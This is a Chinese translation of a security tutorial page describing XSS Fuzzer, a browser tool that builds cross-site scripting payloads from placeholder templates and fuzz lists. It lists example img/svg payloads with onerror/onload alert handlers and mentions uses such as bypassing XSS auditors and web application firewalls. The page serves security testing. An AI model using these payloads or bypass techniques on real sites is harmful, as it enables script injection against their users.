# XSS 模糊器:基于用户定义的向量和模糊列表生成 XSS 有效载荷的工具

> 原文：<https://kalilinuxtutorials.com/xssfuzzer-xss-payloads/>

XSS Fuzzer 是一个简单的应用程序，用普通的 HTML/JavaScript/CSS 编写，使用多个占位符生成基于用户定义的向量的 XSS 有效载荷，这些占位符被替换成模糊列表。

它提供了以纯文本形式生成有效载荷或者在 iframe 中执行它们的可能性。在 iframes 内部，可以使用生成的有效负载从浏览器向任意 URL 发送 GET 或 POST 请求。

**也读作[MC extractor——英特尔、AMD，VIA &飞思卡尔微码提取工具](https://kalilinuxtutorials.com/mcextractor-microcode-extraction-tool/)**

## **XSS Fuzzer 为什么？**

XSS Fuzzer 是一个通用工具，可用于多种目的，包括:

*   为任何浏览器寻找新的 XSS 向量
*   在 GET 和 POST 参数上测试 XSS 有效负载
*   在浏览器中绕过 XSS 审计员
*   绕过 web 应用防火墙
*   利用 HTML 白名单功能

## **例子**

为了模糊，需要创建占位符，例如:

*   带有模糊列表的[TAG]占位符。
*   带有模糊列表的[EVENT]占位符:onerror onload。
*   带有模糊列表的[ATTR]占位符:src 值。
*   有效负载将使用提到的占位符，例如:

```
<[TAG] [ATTR]=Something [EVENT]=[SAVE_PAYLOAD] />
```

[SAVE_PAYLOAD]占位符将被替换为 JavaScript 代码，如 alert(unescape('[PAYLOAD]')；。

成功执行 XSS 有效负载时会触发此代码。

上述模糊列表和有效载荷的结果如下:

```
<img src=Something onerror=alert(unescape('%3Cimg%20src%3DSomething%20onerror%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
<img value=Something onerror=alert(unescape('%3Cimg%20value%3DSomething%20onerror%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
<img src=Something onload=alert(unescape('%3Cimg%20src%3DSomething%20onload%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
<img value=Something onload=alert(unescape('%3Cimg%20value%3DSomething%20onload%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
<svg src=Something onerror=alert(unescape('%3Csvg%20src%3DSomething%20onerror%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
<svg value=Something onerror=alert(unescape('%3Csvg%20value%3DSomething%20onerror%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
<svg src=Something onload=alert(unescape('%3Csvg%20src%3DSomething%20onload%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
<svg value=Something onload=alert(unescape('%3Csvg%20value%3DSomething%20onload%3D%5BSAVE_PAYLOAD%5D%20/%3E')); />
```

当它在诸如 Mozilla Firefox 之类的浏览器中执行时，它会警告执行的有效负载:

```
<svg src=Something onload=[SAVE_PAYLOAD] />
<svg value=Something onload=[SAVE_PAYLOAD] />
<img src=Something onerror=[SAVE_PAYLOAD] />
```

**发送请求**

有可能使用易受 XSS 攻击的页面进行不同的测试，例如绕过浏览器 XSS 审计器。该页面可以接收一个名为 payload 的 GET 或 POST 参数，并将只显示其未转义的值。

[![](img/d861a9096555aeb1980fc054015933d7.png) ](https://github.com/NytroRST/XSSFuzzer) ** *您可以在 [Linkedin](https://www.linkedin.com/company/gbhackers/) 、 [Twitter](https://twitter.com/GbhackerOn) 、[脸书](https://www.facebook.com/gbhackersadmin)上关注我们的日常网络安全更新，您还可以在线参加[最佳网络安全课程](https://ethicalhackersacademy.com/)以保持自我更新。***